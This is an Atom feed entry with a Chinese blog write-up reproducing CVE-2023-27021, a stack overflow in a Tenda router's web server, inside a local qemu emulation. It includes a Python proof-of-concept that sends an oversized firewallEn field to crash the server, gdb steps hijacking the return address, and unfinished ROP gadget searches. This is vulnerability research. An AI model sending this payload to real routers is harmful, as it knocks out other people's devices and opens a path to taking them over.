<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://example.com</id>
    <title> • Posts by &#34;cve-复现系列&#34; tag</title>
    <link href="http://example.com" />
    <updated>2024-05-10T08:11:47.000Z</updated>
    <category term="栈" />
    <category term="shellcode" />
    <category term="rw" />
    <category term="堆拓展攻击" />
    <category term="orw" />
    <category term="堆栈结合" />
    <category term="CVE-复现系列" />
    <category term="wp" />
    <category term="靶机渗透" />
    <category term="vulnHUB" />
    <category term="canary" />
    <category term="堆" />
    <category term="pie" />
    <category term="格式化字符串漏洞" />
    <category term="csu" />
    <category term="rop" />
    <category term="gdb" />
    <category term="格式化字符串" />
    <category term="got表" />
    <category term="srop" />
    <category term="uaf" />
    <category term="unlink" />
    <category term="got改写" />
    <category term="随机数检查" />
    <category term="技巧" />
    <entry>
        <id>http://example.com/2024/05/10/CVE-2023-27021/</id>
        <title>CVE-2023-27021</title>
        <link rel="alternate" href="http://example.com/2024/05/10/CVE-2023-27021/"/>
        <content type="html">&lt;p&gt;CVE-2023-27021-tenda 路由器 - 栈溢出漏洞&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;官网下载链接为：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGVuZGEuY29tLmNuL2Rvd25sb2FkL2RldGFpbC0yNjgwLmh0bWw=&#34;&gt;https://www.tenda.com.cn/download/detail-2680.html&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;去官网下载相应的产品&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#去官网下载相应的产品&#34;&gt;#&lt;/a&gt; 去官网下载相应的产品&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508183219864.png&#34; alt=&#34;image-20240508183219864&#34;&gt;&lt;/p&gt;
&lt;p&gt;下载之后，使用 binwalk 进行解包。&lt;/p&gt;
&lt;h3 id=&#34;解包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解包&#34;&gt;#&lt;/a&gt; 解包&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;binwalk -Me filename.bin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;分解完之后的 &lt;code&gt;squashfs-root&lt;/code&gt;  即为路由器的文件系统。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tenda 路由器的 web 启动程序通常是 bin 目录下的 httpd 文件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;$ file httpd&lt;br&gt;
httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以看到位 arm 架构的 32 位的可执行程序&lt;/p&gt;
&lt;h3 id=&#34;执行程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#执行程序&#34;&gt;#&lt;/a&gt; 执行程序&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;cp $(which qemu-arm-static) ./&lt;/p&gt;
&lt;p&gt;sudo chroot ./ ./qemu-arm-static ./bin/httpd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508191156518.png&#34; alt=&#34;image-20240508191156518&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;发现程序一直卡在这里，拖进 IDA 搜索字符串  &lt;code&gt;WeLoveLinux&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;查找原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查找原因&#34;&gt;#&lt;/a&gt; 查找原因&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508193738684.png&#34; alt=&#34;image-20240508193738684&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508193627887.png&#34; alt=&#34;image-20240508193627887&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过查看，在这里会 check_network。&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rn&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;check_network&#34;&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/netctrl: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/multiWAN: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/httpd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/phddns: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/tendaupload: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/logserver: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libcommon.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;去寻找该函数在那个库里。 &lt;code&gt;libcommon.so&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194018818.png&#34; alt=&#34;image-20240508194018818&#34;&gt;&lt;/p&gt;
&lt;p&gt;函数主体&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194346053.png&#34; alt=&#34;image-20240508194346053&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次寻找 &lt;code&gt;get_eth_name&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;grep&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-rn&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;get_eth_name&#34;&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/netctrl: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/dnrd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/multiWAN: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/dhcpcd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/httpd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/business_proc: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/cfmd: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: bin/time_check: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libtpi.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libChipApi.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;grep: lib/libcommon.so: 匹配到二进制文件&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508194612599.png&#34; alt=&#34;image-20240508194612599&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508201108424.png&#34; alt=&#34;image-20240508201108424&#34;&gt;&lt;/p&gt;
&lt;p&gt;从这里我们就可以看到需要什么类型的虚拟网络接口了。对应前面的 &lt;code&gt;get_eth_name(0)&lt;/code&gt; ===&amp;gt; 所以我们需要 br0&lt;/p&gt;
&lt;h3 id=&#34;建立虚拟网络接口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#建立虚拟网络接口&#34;&gt;#&lt;/a&gt; 建立虚拟网络接口&lt;/h3&gt;
&lt;p&gt;通过 &lt;code&gt;ifconfig&lt;/code&gt;  查看本地的网卡&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508183856764.png&#34; alt=&#34;image-20240508183856764&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用以下命令建立虚拟网桥并进行 UP&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr br0 
这个命令创建一个新的虚拟网桥（bridge），名为br0。brctl是用于管理网络网桥的命令行工具，addbr选项用于添加一个新的网桥。这里，我们添加了一个名为br0的网桥。

sudo brctl addif br0 ens33
这个命令将物理网络接口ens33添加到刚刚创建的虚拟网桥br0中。addif选项用于将网络接口添加到网桥。这样，所有通过ens33接口的网络流量都会被转发到br0网桥，从而实现多个网络接口之间的通信。

sudo ifconfig br0 up
这个命令启用（激活）虚拟网桥br0。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用up选项来激活br0网桥，使其可以开始处理网络流量。

sudo dhclient br0
这个命令为虚拟网桥br0分配一个动态IP地址。dhclient是一个用于请求和配置动态主机配置协议（DHCP）的命令行工具。在这里，我们使用dhclient为br0网桥获取一个动态IP地址，这样它就可以与其他网络设备进行通信。

sudo tunctl -t br0 -u &#39;whoami&#39;
这个命令创建一个名为br0的虚拟网络接口。tunctl是一个用于管理虚拟网络设备的命令行工具，通常用于创建和管理TUN/TAP设备。在这里，我们使用-t选项来指定设备名称（br0），-u选项来指定拥有该设备的用户的用户名。&#39;whoami&#39;是一个shell命令，用于输出当前用户的用户名，因此这里会创建一个虚拟网络接口，其所有者为执行命令的当前用户。

sudo ifconfig br0 192.168.65.1/24
这个命令为虚拟网络接口br0分配一个静态IP地址。ifconfig是一个用于配置网络接口的命令行工具。在这里，我们使用它来为br0接口指定一个IP地址（192.168.65.1）和一个子网掩码（/24）。这意味着网络接口将使用192.168.65.1作为其IP地址，子网掩码为255.255.255.0。
&amp;gt; sudo ifconfig br0 down &amp;amp;&amp;amp; sudo brctl delbr br0 停止网络接口并删除
&amp;gt; sudo netstat -tulnp | grep 192.168.65.1:80 查找对应的服务
&amp;gt; kill -9 PID kill 命令来停止它
&amp;gt; sudo netplan apply ens33无ip修复
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508184626432.png&#34; alt=&#34;image-20240508184626432&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;再次出现问题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#再次出现问题&#34;&gt;#&lt;/a&gt; 再次出现问题&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508201807056.png&#34; alt=&#34;image-20240508201807056&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;查找原因-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查找原因-2&#34;&gt;#&lt;/a&gt; 查找原因&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508204305586.png&#34; alt=&#34;image-20240508204305586&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508204329574.png&#34; alt=&#34;image-20240508204329574&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GPT:
socket(1, 1, 0): 这个函数需要三个参数：

第一个参数是域（domain），它指定了socket的协议族。在这个例子中，1代表AF_INET，即IPv4的因特网协议族。
第二个参数是类型（type），它指定了socket的通信方式。在这个例子中，1代表SOCK_STREAM，表示一个面向连接的、可靠的字节流socket，通常用于TCP协议。
第三个参数是协议（protocol），它指定了socket使用的特定协议。在这个例子中，0表示让系统选择默认协议。对于SOCK_STREAM类型的socket，通常使用TCP协议。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以我们暂时无法依照现在的环境去修改网络状况。&lt;/p&gt;
&lt;p&gt;但是还有一种办法我们可以修改执行逻辑。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508205103089.png&#34; alt=&#34;image-20240508205103089&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以我们去修改这两块的逻辑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508211506399.png&#34; alt=&#34;image-20240508211506399&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo chroot ./ ./qemu-arm-static ./bin/httpd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508211557449.png&#34; alt=&#34;image-20240508211557449&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此时就可以正常访问了&lt;/p&gt;
&lt;p&gt;但是当我们正常访问时，发现网页是 404，此时我们让下面的 webroot_ro 的里面文件刷进去即可。&lt;/p&gt;
&lt;h3 id=&#34;测试漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#测试漏洞&#34;&gt;#&lt;/a&gt; 测试漏洞&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508220917436.png&#34; alt=&#34;image-20240508220917436&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 IDA 逆向 httpd 文件，寻找可以造成栈溢出的函数。挖掘栈溢出漏洞，通常我们要从一些危险函数入手，第一类函数是 scanf，可能产生格式化字符串溢出漏洞，第二类是 strcpy、strcat、sprintf 等字符串拷贝函数。根据 tenda 的历史 CVE 漏洞，strcpy 函数产生的漏洞比较多，所以我们从 strcpy 入手举例。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508221310337.png&#34; alt=&#34;image-20240508221310337&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们通过这个去寻找防火墙的漏洞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240508222124288.png&#34; alt=&#34;image-20240508222124288&#34;&gt;&lt;/p&gt;
&lt;p&gt;src 直接去复制到 dest 里，后续也没有对 dest 的长度进行检测。&lt;/p&gt;
&lt;p&gt;还需要我们去确定这个是否可以进行传入，sub_2BA8C 是 WebGetvar (goahead 的函数，暂时还不会恢复符号表)，所以我们是可以通过这个函数进行传参的。接下来我们进行测试。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509095758402.png&#34; alt=&#34;image-20240509095758402&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509095531606.png&#34; alt=&#34;image-20240509095531606&#34;&gt;&lt;/p&gt;
&lt;p&gt;故猜测以及目录为 goform&lt;/p&gt;
&lt;p&gt;测试 POC 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; requests&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;url &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;http://192.168.65.1/goform/SetFirewallCfg&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;header &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;Content-Type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token string&#34;&gt;&#34;Cookie&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;password=hdjcvb&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;A&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;500&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;firewallEn&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; requests&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;url&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; headers&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;header&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; data&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;data&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; timeout&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;执行 POC 后：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100524266.png&#34; alt=&#34;image-20240509100524266&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100543004.png&#34; alt=&#34;image-20240509100543004&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509100606754.png&#34; alt=&#34;image-20240509100606754&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以可以得知存在拒绝服务漏洞。&lt;/p&gt;
&lt;h3 id=&#34;利用漏洞-gdb调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用漏洞-gdb调试&#34;&gt;#&lt;/a&gt; 利用漏洞 - gdb 调试&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509075854662.png&#34; alt=&#34;image-20240509075854662&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试漏洞的保护&lt;/p&gt;
&lt;p&gt;因为 NX 保护开启，无法向栈上写入 shellcode 去执行。可以去利用 rop，去进行获取 shell&lt;/p&gt;
&lt;h4 id=&#34;配置gdb动态调试环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置gdb动态调试环境&#34;&gt;#&lt;/a&gt; 配置 gdb 动态调试环境&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;开启另一个终端&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;gdb-multiarch ./bin/httpd&lt;/p&gt;
&lt;p&gt;pwndbg&amp;gt; set architecture arm&lt;/p&gt;
&lt;p&gt;pwndbg&amp;gt; target remote :9999&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo lsof -i :9999 查看 gdb 绑定端口的 PID&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样我们就可以去调试程序了&lt;/p&gt;
&lt;h4 id=&#34;利用poc去劫持ret&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用poc去劫持ret&#34;&gt;#&lt;/a&gt; 利用 POC 去劫持 ret&lt;/h4&gt;
&lt;p&gt;进入 gdb 调试后我们先 n 上两步，然后执行 POC 两次，观测 gdb&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509102326859.png&#34; alt=&#34;image-20240509102326859&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现返回地址确实被我们去劫持到一个我们人为输入的值。接下来就是测试我们如何将这个改成一个可获取 shell 的 rop&lt;/p&gt;
&lt;h3 id=&#34;利用漏洞-获取shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用漏洞-获取shell&#34;&gt;#&lt;/a&gt; 利用漏洞 - 获取 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;获取返回地址据输入偏移量&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509103042769.png&#34; alt=&#34;image-20240509103042769&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;寻找 libc 基址&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用 vmmap 看内存信息&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509103454383.png&#34; alt=&#34;image-20240509103454383&#34;&gt;&lt;/p&gt;
&lt;p&gt;猜测箭头所指出为 libc 基址。&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;寻找 gadget&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 ROPgadget，在 libc 中找一个可以控制 r0 的 gadget&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./lib/libc.so.0 | grep &amp;quot;mov r0, sp&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509104401520.png&#34; alt=&#34;image-20240509104401520&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;再在 libc 中找一个可以 pop 到 r3 的 gadget&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary ./lib/libc.so.0 --only &amp;quot;pop&amp;quot;|grep r3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/CVE-2023-27021/image-20240509104744796.png&#34; alt=&#34;image-20240509104744796&#34;&gt;&lt;/p&gt;
&lt;p&gt;后续补充…&lt;/p&gt;
</content>
        <category term="CVE-复现系列" />
        <updated>2024-05-10T08:11:47.000Z</updated>
    </entry>
</feed>
